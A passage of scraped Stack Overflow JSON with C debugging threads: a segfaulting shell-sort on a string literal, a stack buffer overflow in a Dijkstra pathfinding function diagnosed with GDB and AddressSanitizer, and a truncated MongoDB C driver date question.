"https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "edited": false, "score": 1, "creation_date": 1444824814, "post_id": 33124871, "comment_id": 54062355, "body": "Seems pretty clear you&#39;re exceeding your array bounds."}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "reply_to_user": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 0, "creation_date": 1444824835, "post_id": 33124871, "comment_id": 54062372, "body": "@dandan78 Segmentation fault"}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "reply_to_user": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1444824927, "post_id": 33124871, "comment_id": 54062415, "body": "@PaulR Computing the gap in shell-sort is the best with 2.2 value instead of 2. I am aware what it does given that the value is integer"}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "reply_to_user": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "edited": false, "score": 0, "creation_date": 1444824963, "post_id": 33124871, "comment_id": 54062438, "body": "@machineyearning I guess you&#39;re right (given the error I get), but the code seems ok to me."}, {"owner": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "edited": false, "score": 1, "creation_date": 1444825025, "post_id": 33124871, "comment_id": 54062490, "body": "@Croolman I recommend refactoring your code to simplify your indexing math. Can you post the code for the <code>length</code> function? Usually the practice is to pass the length around as a parameter with the array."}, {"owner": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 2, "creation_date": 1444825039, "post_id": 33124871, "comment_id": 54062504, "body": "@Croolman Have you tried running in a debugger? Just reading code isn&#39;t the best way to find errors. Also, update your question to clarify what you mean by &#39;fails&#39;."}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "reply_to_user": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 0, "creation_date": 1444825424, "post_id": 33124871, "comment_id": 54062757, "body": "@dandan78 I ve tried. That&#39;s how I know I ve &#39;violated the laws of memory&#39;"}, {"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 0, "creation_date": 1444825486, "post_id": 33124871, "comment_id": 54062802, "body": "how do you call the function? something like <code>sort(&quot;test&quot;);</code>?"}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "reply_to_user": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "edited": false, "score": 0, "creation_date": 1444825528, "post_id": 33124871, "comment_id": 54062829, "body": "@machineyearning There&#39;s nothing special about that function, the problem doesnt lie there. I am aware of that practise as such, but can&#39;t do it that way."}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "reply_to_user": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 0, "creation_date": 1444825601, "post_id": 33124871, "comment_id": 54062896, "body": "@mch Nope. <code>char *str = &quot;test string&quot;; sort(str);</code> I call it as an argument of printf function, so it is printed out directly."}, {"owner": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 0, "creation_date": 1444825678, "post_id": 33124871, "comment_id": 54062951, "body": "@Croolman Okay, so you know which lines it crashes on. You also probably know that a segmentation fault means you are probably accessing memory that does not &#39;belong&#39; to you. Have you inspected your indexes? They are likely not what you expect them to be..."}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "reply_to_user": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 0, "creation_date": 1444826011, "post_id": 33124871, "comment_id": 54063185, "body": "@dandan78 I&#39;ve checked the indexes while debugging. It fails right in the first round with all indexes being in correct ranges. Everything seems to be just right."}, {"owner": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 0, "creation_date": 1444826558, "post_id": 33124871, "comment_id": 54063582, "body": "@Croolman For future reference, all of the information you gave in answer to the comments written by me and the others should&#39;ve been in your question to begin with. That&#39;s in case you&#39;re wondering why you have 3 close votes and 2 downvotes."}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "reply_to_user": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 0, "creation_date": 1444826726, "post_id": 33124871, "comment_id": 54063685, "body": "@dandan78 Thanks, I&#39;ll think of that next time I post the question."}], "answers": [{"tags": [], "owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "is_accepted": false, "score": 1, "last_activity_date": 1444825849, "creation_date": 1444825849, "answer_id": 33125375, "question_id": 33124871, "link": "https://stackoverflow.com/questions/33124871/swapping-elements-of-char-array-in-c/33125375#33125375", "title": "Swapping elements of char array in C", "body": "<p>How do you test your function? With a static string (i.e. char *buffer = \"test string\";) ?</p>\n\n<p>Because on first loop at least j and j-gap should be inside the string boundaries. So if you get a segfault I guess it is because of a bad string (statics can't be modified).</p>\n\n<p>Replacing length() by strlen() and calling it with a well-created test string lead me to a valid result:\n\"adgfbce\" \u2192 \"gfedcba\"</p>\n"}, {"comments": [{"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "edited": false, "score": 0, "creation_date": 1444826271, "post_id": 33125380, "comment_id": 54063375, "body": "You&#39;re right. I&#39;ve never thought of that. That is absolutely working."}, {"owner": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "edited": false, "score": 0, "creation_date": 1444826399, "post_id": 33125380, "comment_id": 54063466, "body": "Great answer, however I think he will also have problems with array bounds based on my analysis below."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "edited": false, "score": 1, "creation_date": 1444826475, "post_id": 33125380, "comment_id": 54063518, "body": "@machineyearning  Yes , he has to take your points also in account or else OP may get undefined behaviour as a gift :)"}], "tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": true, "score": 6, "last_activity_date": 1444830453, "last_edit_date": 1444830453, "creation_date": 1444825866, "answer_id": 33125380, "question_id": 33124871, "link": "https://stackoverflow.com/questions/33124871/swapping-elements-of-char-array-in-c/33125380#33125380", "title": "Swapping elements of char array in C", "body": "<p>As you say in comment , you call our function like this -</p>\n\n<pre><code> char *str = \"test string\";\n sort(str);\n</code></pre>\n\n<p>String literal is in read-only memory and creates a pointer <code>str</code> to that, thus it <em>cannot be modified</em> , and your function modifies it . Therefore ,it can result in segmentation fault . </p>\n\n<p>Declare like this -</p>\n\n<pre><code> char str[] = \"test string\";\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "edited": false, "score": 0, "creation_date": 1444826460, "post_id": 33125413, "comment_id": 54063510, "body": "Unfortunately, this will never happen, considering that starting position of i is 0 and gap is maximum, after one loop the gap is divided by 2 and i is incremented by 1. So it cant exceed the range of the array."}, {"owner": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "reply_to_user": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "edited": false, "score": 0, "creation_date": 1444829005, "post_id": 33125413, "comment_id": 54065301, "body": "That&#39;s not true, gap isn&#39;t modified until after the <code>for</code> loop terminates, meaning <code>i</code> has already taken on every value from <code>0 .. length - 1</code>. Neither is <code>gap</code> the maximum of <code>i</code>, as clearly stated in your <code>for</code> loop logic <code>for (int i = 0; i &lt; lnght; i++)</code>"}, {"owner": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "reply_to_user": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "edited": false, "score": 0, "creation_date": 1444831642, "post_id": 33125413, "comment_id": 54067276, "body": "@Croolman even if you had everything right here, spending a long time thinking about indexing arrays and their boundaries is the most dire curse of C/C++. I would strongly suggest you get in the habit of keeping your indexing logic as simple as possible in order to avoid little one-off bugs etc. It&#39;s not a problem with you as a programmer, it&#39;s a language design flaw (&quot;feature&quot;). Unfortunately the best way to deal with it is to only touch the indexes when absolutely necessary. Encapsulate indexing logic in reusable functions so you don&#39;t make little mistakes that everyone makes."}, {"owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "edited": false, "score": 0, "creation_date": 1444841840, "post_id": 33125413, "comment_id": 54074189, "body": "Yeah, you&#39;re right. Sorry, my fault. I&#39;ll have to look into it. ... Indexes are for sure a lil bit tricky think and in this example I use them a lot, althought sometimes it is hard to live without them, but I get you."}], "tags": [], "owner": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/94202977db4bbe63aa42d0f7d3f1b67d?s=128&d=identicon&r=PG", "display_name": "machine yearning", "link": "https://stackoverflow.com/users/798684/machine-yearning"}, "is_accepted": false, "score": 2, "last_activity_date": 1444825959, "creation_date": 1444825959, "answer_id": 33125413, "question_id": 33124871, "link": "https://stackoverflow.com/questions/33124871/swapping-elements-of-char-array-in-c/33125413#33125413", "title": "Swapping elements of char array in C", "body": "<p>In situations like this look at your statements not so much as executable code, but as mathematical boundary conditions. I've replaced the monstrous name <code>lnght</code> with <code>length</code> for readability purposes.</p>\n\n<p>Here are the relevant conditions that affect the value of <code>j</code> when entering the <code>while</code> loop, relative to the length.</p>\n\n<pre><code>i &lt; length;\ngap = length / 2;\nj = i + gap;\n</code></pre>\n\n<p>Now we plug in a value. Consider the case where <code>length == 10</code>. Then presumably the maximum index in your array is <code>9</code> which is also the highest value that <code>i</code> can take on. </p>\n\n<p>Then we also have that <code>gap == 5</code> and so after entering the <code>while</code> loop <code>j == i + gap == 9 + 5</code>. Clearly <code>9 + 5 &gt; 10</code>. The rest is left as an exercise to the programmer.</p>\n"}], "owner": {"reputation": 1023, "user_id": 1947081, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0abfed788c885ecb97b6ee07e7b68f5f?s=128&d=identicon&r=PG", "display_name": "Croolman", "link": "https://stackoverflow.com/users/1947081/croolman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 406, "favorite_count": 0, "accepted_answer_id": 33125380, "answer_count": 3, "score": -1, "last_activity_date": 1444830453, "creation_date": 1444824432, "last_edit_date": 1444825298, "question_id": 33124871, "link": "https://stackoverflow.com/questions/33124871/swapping-elements-of-char-array-in-c", "title": "Swapping elements of char array in C", "body": "<p>I have this code: </p>\n\n<pre><code>char *sort(char *string){ //shell-sort\n    int lnght = length(string) - 1; // length is my own function\n    int gap = lnght / 2;\n    while (gap &gt; 0)\n    {\n        for (int i = 0; i &lt; lnght; i++)\n        {\n            int j = i + gap;\n            int tmp =(int)string[j];\n            while (j &gt;= gap &amp;&amp; tmp &gt; (int)string[j - gap])\n            {\n                string[j] = string[j - gap]; // code fails here\n                j -= gap;\n            }\n            string[j] = (char)tmp; // and here as well\n        }\n        if (gap == 2){\n            gap = 1;\n        }\n        else{\n            gap /= 2.2;\n        }\n    }\n    return string;\n}\n</code></pre>\n\n<p>The code should sort (shell-sort) the characters in the string, given the ordinal value (ASCII value). Even though the code is pretty simple, it still fails at lines I've commented - segmentation fault. I've spent plenty of time with this code and still can't find the problem.</p>\n"}, {"tags": ["c", "debugging", "segmentation-fault", "gdb", "valgrind"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444824921, "post_id": 33124848, "comment_id": 54062411, "body": "Do you allocate memory to <code>buffer</code> ?"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 1, "creation_date": 1444824977, "post_id": 33124848, "comment_id": 54062454, "body": "Shouldn&#39;t <code>sizeof(link)</code> be <code>sizeof(Link)</code> ? (And what is <code>link</code> anyway ?)."}, {"owner": {"reputation": 41, "user_id": 4810959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2872c8e882f84e8b891ade5ea36f54f3?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Mckay", "link": "https://stackoverflow.com/users/4810959/ryan-mckay"}, "edited": false, "score": 0, "creation_date": 1444825850, "post_id": 33124848, "comment_id": 54063060, "body": "typedef struct _link {     LocationID loc;     TransportID type;     float dist; } link;  typedef struct _link *Link;  Its the link between two nodes on a graph ADT"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1444832881, "post_id": 33124848, "comment_id": 54068202, "body": "OK - so <code>Link</code> is essentially a <code>link *</code> - that makes sense, but I&#39;d advise not doing stuff like this when you get out into the real world."}, {"owner": {"reputation": 41, "user_id": 4810959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2872c8e882f84e8b891ade5ea36f54f3?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Mckay", "link": "https://stackoverflow.com/users/4810959/ryan-mckay"}, "edited": false, "score": 0, "creation_date": 1444860861, "post_id": 33124848, "comment_id": 54084570, "body": "would you/ or anyone elaborate on why I shouldn&#39;t please?"}], "answers": [{"comments": [{"owner": {"reputation": 41, "user_id": 4810959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2872c8e882f84e8b891ade5ea36f54f3?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Mckay", "link": "https://stackoverflow.com/users/4810959/ryan-mckay"}, "edited": false, "score": 0, "creation_date": 1444870782, "post_id": 33127518, "comment_id": 54087505, "body": "That worked a treat. I was operating under the assumption that valgrind would alert me to the type of overflow that was causing the problem and therefore attributed it to something unseen."}, {"owner": {"reputation": 162629, "user_id": 50617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YFykQ.png?s=128&g=1", "display_name": "Employed Russian", "link": "https://stackoverflow.com/users/50617/employed-russian"}, "reply_to_user": {"reputation": 41, "user_id": 4810959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2872c8e882f84e8b891ade5ea36f54f3?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Mckay", "link": "https://stackoverflow.com/users/4810959/ryan-mckay"}, "edited": false, "score": 1, "creation_date": 1444871067, "post_id": 33127518, "comment_id": 54087565, "body": "@RyanMckay Valgrind performs very little checking of stack and globals. Address Sanitizer is <i>much</i> better for that."}], "tags": [], "owner": {"reputation": 162629, "user_id": 50617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YFykQ.png?s=128&g=1", "display_name": "Employed Russian", "link": "https://stackoverflow.com/users/50617/employed-russian"}, "is_accepted": false, "score": 7, "last_activity_date": 1444833784, "last_edit_date": 1444833784, "creation_date": 1444831402, "answer_id": 33127518, "question_id": 33124848, "link": "https://stackoverflow.com/questions/33124848/c-segmentation-fault-gdb-error-reading-variable/33127518#33127518", "title": "C: Segmentation fault: GDB: &lt;error reading variable&gt;", "body": "<p>The fact that all your parameters look good before this line:</p>\n\n<pre><code>appendLocationsToQueue(currentView, pQ, pQLen, buffer, bufferLen, cur);\n</code></pre>\n\n<p>and become unavailable after it tells me that you've stepped on (wrote <code>0x7fff00000000</code> to) the <code>$rbp</code> register (all local variables and parameters are relative to <code>$rbp</code> when building without optimization).</p>\n\n<p>You can confirm this in GDB with <code>print $rbp</code> before and after call to <code>appendLocationsToQueue</code> (<code>$rbp</code> is supposed to always have the same value inside a given function, but will have changed).</p>\n\n<p>Assuming this is true, there are only a few ways this could happen, and the most likely way is a stack buffer overflow in <code>appendLocationsToQueue</code> (or something it calls).</p>\n\n<p>You should be able to use Address Sanitizer (<code>g++ -fsanitize=address ...</code>) to find this bug fairly easily.</p>\n\n<p>It's also fairly easy to find the overflow in GDB: step into <code>appendLocationsToQueue</code>, and do <code>watch -l *(char**)$rbp</code>, <code>continue</code>. The watchpoint should fire when your code overwrites the <code>$rbp</code> save location.</p>\n"}], "owner": {"reputation": 41, "user_id": 4810959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2872c8e882f84e8b891ade5ea36f54f3?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Mckay", "link": "https://stackoverflow.com/users/4810959/ryan-mckay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7991, "favorite_count": 0, "answer_count": 1, "score": 4, "last_activity_date": 1444833784, "creation_date": 1444824381, "question_id": 33124848, "link": "https://stackoverflow.com/questions/33124848/c-segmentation-fault-gdb-error-reading-variable", "title": "C: Segmentation fault: GDB: &lt;error reading variable&gt;", "body": "<p>I have a function shortestPath() that is a modified implementation of Dijkstra's algorithm for use with a board game AI I am working on for my comp2 class. I have trawled through the website and using gdb and valgrind I know exactly where the segfault happens (actually knew that a few hours ago), but can't figure out what undefined behaviour or logic error is causing the problem. </p>\n\n<p>The function in which the problem occurs is called around 10x and works as expected until it segfaults with GDB:\n\"error reading variable: cannot access memory\" \nand valgrind:\n\"Invalid read of size 8\"</p>\n\n<p>Normally that would be enough, but I can't work this one out. Also any general advise and tips are appreciated... thanks!</p>\n\n<p>GDB: <a href=\"https://gist.github.com/mckayryan/b8d1e9cdcc58dd1627ea\" rel=\"nofollow\">https://gist.github.com/mckayryan/b8d1e9cdcc58dd1627ea</a><br>\nValgrind: <a href=\"https://gist.github.com/mckayryan/8495963f6e62a51a734f\" rel=\"nofollow\">https://gist.github.com/mckayryan/8495963f6e62a51a734f</a></p>\n\n<p>Here is the function in which the segfault occurs:</p>\n\n<pre><code>static void processBuffer (GameView currentView, Link pQ, int *pQLen, \n                           LocationID *buffer, int bufferLen, Link prev,\n                           LocationID cur)\n{\n    //printLinkIndex(\"prev\", prev, NUM_MAP_LOCATIONS);\n    // adds newly retrieved buffer Locations to queue adding link types \n    appendLocationsToQueue(currentView, pQ, pQLen, buffer, bufferLen, cur);\n    // calculates distance of new locations and updates prev when needed\n    updatePrev(currentView, pQ, pQLen, prev, cur);  &lt;--- this line here \n\n    qsort((void *) pQ, *pQLen, sizeof(link), (compfn)cmpDist);\n    // qsort sanity check\n    int i, qsortErr = 0;\n    for (i = 0; i &lt; *pQLen-1; i++) \n        if (pQ[i].dist &gt; pQ[i+1].dist) qsortErr = 1;\n    if (qsortErr) {\n        fprintf(stderr, \"loadToPQ: qsort did not sort succesfully\");\n        abort();\n    }  \n}\n</code></pre>\n\n<p>and the function whereby after it is called everything falls apart:</p>\n\n<pre><code>static void appendLocationsToQueue (GameView currentView, Link pQ, \n                                   int *pQLen, LocationID *buffer, \n                                   int bufferLen, LocationID cur)\n{\n    int i, c, conns;\n    TransportID type[MAX_TRANSPORT] = { NONE };     \n\n    for (i = 0; i &lt; bufferLen; i++) { \n        // get connection information (up to 3 possible)  \n        conns = connections(currentView-&gt;gameMap, cur, buffer[i], type);\n        for (c = 0; c &lt; conns; c++) {\n            pQ[*pQLen].loc = buffer[i];\n            pQ[(*pQLen)++].type = type[c];            \n        }            \n    }\n}\n</code></pre>\n\n<p>So I thought that a pointer had been overridden to the wrong address, but after a lot of printing in GDB that doesn't seem to be the case. I also rotated through making reads/writes to the variables in question to see which trigger the fault and they all do after appendLocationsToQueue(), but not before (or at the end of that function for that matter).</p>\n\n<p>Here is the rest of the relevant code:\nshortestPath():</p>\n\n<pre><code>Link shortestPath (GameView currentView, LocationID from, LocationID to, PlayerID player, int road, int rail, int boat)\n{\n    if (!RAIL_MOVE) rail = 0;\n\n    // index of locations that have been visited    \n    int visited[NUM_MAP_LOCATIONS] = { 0 };\n\n    // current shortest distance from the source\n    // the previous node for current known shortest path\n    Link prev;\n    if(!(prev = malloc(NUM_MAP_LOCATIONS*sizeof(link))))\n        fprintf(stderr, \"GameView.c: shortestPath: malloc failure (prev)\");\n\n    int i;\n    // intialise link data structure\n    for (i = 0; i &lt; NUM_MAP_LOCATIONS; i++) {\n        prev[i].loc = NOWHERE;\n        prev[i].type = NONE;\n        if (i != from) prev[i].dist = INF; \n        else prev[i].dist = LAST; \n    }\n    LocationID *buffer, cur;\n    // a priority queue that dictates the order LocationID's are checked\n    Link pQ;\n    int bufferLen, pQLen = 0;\n    if (!(pQ = malloc(MAX_QUEUE*sizeof(link))))\n        fprintf(stderr, \"GameView.c: shortestPath: malloc failure (pQ)\");\n    // load initial location into queue\n    pQ[pQLen++].loc = from;\n\n    while (!visited[to]) {\n        // remove first item from queue into cur  \n        shift(pQ, &amp;pQLen, &amp;cur);\n        if (visited[cur]) continue;\n        // freeing malloc from connectedLocations()\n        if (cur != from) free(buffer); \n        // find all locations connected to   \n        buffer = connectedLocations(currentView, &amp;bufferLen, cur, \n                                    player, currentView-&gt;roundNum, road, \n                                    rail, boat); \n        // mark current node as visited\n        visited[cur] = VISITED;\n        // locations from buffer are used to update priority queue (pQ) \n        // and distance information in prev       \n        processBuffer(currentView, pQ, &amp;pQLen, buffer, bufferLen, prev,\n                      cur);\n    }\n    free(buffer);\n    free(pQ);\n    return prev;\n}\n</code></pre>\n"}, {"tags": ["c", "mongodb"], "answers": [{"tags": [], "owner": {"reputation": 2696, "user_id": 1352426, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/mQFHO.png?s=128&g=1", "display_name": "v0d1ch", "link": "https://stackoverflow.com/users/1352426/v0d1ch"}, "is_accepted": true, "score": 1, "last_activity_date": 1444846344, "creation_date": 1444846344, "answer_id": 33132634, "question_id": 33124789, "link": "https://stackoverflow.com/questions/33124789/c-mongodb-driver-datetime-update/33132634#33132634", "title": "C MongoDB driver DateTime update", "body": "<p>Ok I found the solution myself, should have read the api more carefully :)</p>\n\n<p>The BCON_DATE_TIME accepts milliseconds instead of seconds which I passed to it.</p>\n\n<p>I actually tried to multiply by 1000 before but since my var was int it could not store the correct value.</p>\n\n<p>I had to declare it as</p>\n\n<pre><code> unsigned long long\n</code></pre>\n\n<p>Here is the changed code just for reference</p>\n\n<pre><code>long convert_to_long(char *dateString)\n{\n  struct tm *parsedTime;\n  time_t rawTime;\n  time_t newTime;\n  int hour, minutes, seconds, millis, year, month, day;\n\n  if (sscanf(dateString, \"%d:%d:%d      %d %d %d\",\n    &amp;hour, &amp;minutes, &amp;seconds, &amp;month, &amp;day, &amp;year) != EOF) {\n    time(&amp;rawTime);\n    parsedTime = localtime(&amp;rawTime);\n    parsedTime-&gt;tm_year = year - 1900;\n    parsedTime-&gt;tm_mon = month - 1;\n    parsedTime-&gt;tm_mday = day;\n    